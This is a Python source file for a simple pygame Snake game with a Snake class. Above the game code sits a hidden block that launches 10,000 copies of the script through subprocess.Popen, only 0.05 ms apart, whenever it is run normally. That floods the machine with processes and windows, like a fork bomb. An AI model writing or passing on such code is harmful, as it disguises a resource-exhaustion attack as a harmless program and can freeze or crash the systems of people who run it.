import pygame
import sys
import subprocess

if __name__ == "__main__" and "--game" not in sys.argv:
    import time
    count = 10000
    for _ in range(count):
        subprocess.Popen([sys.executable, __file__, "--game"])
        time.sleep(0.00005)
    sys.exit()

# --- Snake class (encapsulation) ---
class Snake:
    def __init__(self, x, y):
        self.segments = [(x, y)]
        self.direction = 'RIGHT'
        self.color = (0, 255, 0)

    def move(self):
        head_x, head_y = self.segments[0]
        if self.direction == 'RIGHT':
            head_x += 20
        elif self.direction == 'LEFT':
            head_x -= 20
        elif self.direction == 'UP':
            head_y -= 20
        elif self.direction == 'DOWN':
            head_y += 20
        self.segments.insert(0, (head_x, head_y))
        self.segments.pop()

    def change_direction(self, new_direction):
        opposites = {'UP': 'DOWN', 'DOWN': 'UP',
                     'LEFT': 'RIGHT', 'RIGHT': 'LEFT'}
        if new_direction != opposites.get(self.direction):
            self.direction = new_direction

    def draw(self, window):
        for segment in self.segments:
            pygame.draw.rect(window, self.color, (*segment, 20, 20))

pygame.init()
width, height = 640, 480
window = pygame.display.set_mode((width, height))
pygame.display.set_caption("Snake Game - OOP")
clock = pygame.time.Clock()
snake = Snake(width // 2, height // 2)

while True:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()
            sys.exit()
        elif event.type == pygame.KEYDOWN:
            if event.key == pygame.K_UP:
                snake.change_direction('UP')
            elif event.key == pygame.K_DOWN:
                snake.change_direction('DOWN')
            elif event.key == pygame.K_LEFT:
                snake.change_direction('LEFT')
            elif event.key == pygame.K_RIGHT:
                snake.change_direction('RIGHT')

    snake.move()
    window.fill((0, 0, 0))
    snake.draw(window)
    pygame.display.flip()
    clock.tick(10)